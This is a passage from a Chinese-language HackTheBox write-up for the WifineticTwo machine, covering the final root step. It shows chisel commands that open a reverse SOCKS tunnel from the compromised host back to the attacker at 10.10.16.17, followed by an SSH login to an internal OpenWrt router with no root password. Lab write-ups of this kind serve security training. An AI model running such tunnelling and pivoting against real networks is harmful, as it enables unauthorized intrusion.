+<h2 id="0x8-Root-txt"><a href="#0x8-Root-txt" class="headerlink" title="0x8 Root.txt"></a>0x8 Root.txt</h2><p>由於看到有一個網段是 192.168.1.0 的，所以打開看看 192.168.1.1，使用chisel轉發。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地</span></span><br><span class="line"> ./chisel_linux_amd64 server -p 3333 --reverse</span><br><span class="line"><span class="comment"># 對面</span></span><br><span class="line">./chisel_linux_amd64 client 10.10.16.17:3333 R:socks</span><br></pre></td></tr></table></figure>
+
+<p>使用賬號密碼 root 即可登錄，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/03-W9mZYHOgRyp5hUYQ-WifineticTwo/image-20240317183504-w4e5q5g.png" alt="image">​</p>
+<p>flag 就在這個路由器的ssh裏面，ssh不需要密碼。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@attica01:/opt/PLC/OpenPLC_v3/webserver<span class="comment"># ssh root@192.168.1.1</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.1 (192.168.1.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.1<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  _______                     ________        __</span></span><br><span class="line"><span class="string"> |       |.-----.-----.-----.|  |  |  |.----.|  |_</span></span><br><span class="line"><span class="string"> |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|</span></span><br><span class="line"><span class="string"> |_______||   __|_____|__|__||________||__|  |____|</span></span><br><span class="line"><span class="string">          |__| W I R E L E S S   F R E E D O M</span></span><br><span class="line"><span class="string"> -----------------------------------------------------</span></span><br><span class="line"><span class="string"> OpenWrt 23.05.2, r23630-842932a63d</span></span><br><span class="line"><span class="string"> -----------------------------------------------------</span></span><br><span class="line"><span class="string">=== WARNING! =====================================</span></span><br><span class="line"><span class="string">There is no root password defined on this device!</span></span><br><span class="line"><span class="string">Use the &quot;passwd&quot; command to set up a new password</span></span><br><span class="line"><span class="string">in order to prevent unauthorized SSH logins.</span></span><br><span class="line"><span class="string">--------------------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&text=HackTheBox - Machine - WifineticTwo"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&is_video=false&description=HackTheBox - Machine - WifineticTwo"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - WifineticTwo&body=Check out this article: https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&title=HackTheBox - Machine - WifineticTwo"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&name=HackTheBox - Machine - WifineticTwo&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/03/18/2024-htb-machine/11-WifineticTwo/&t=HackTheBox - Machine - WifineticTwo"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
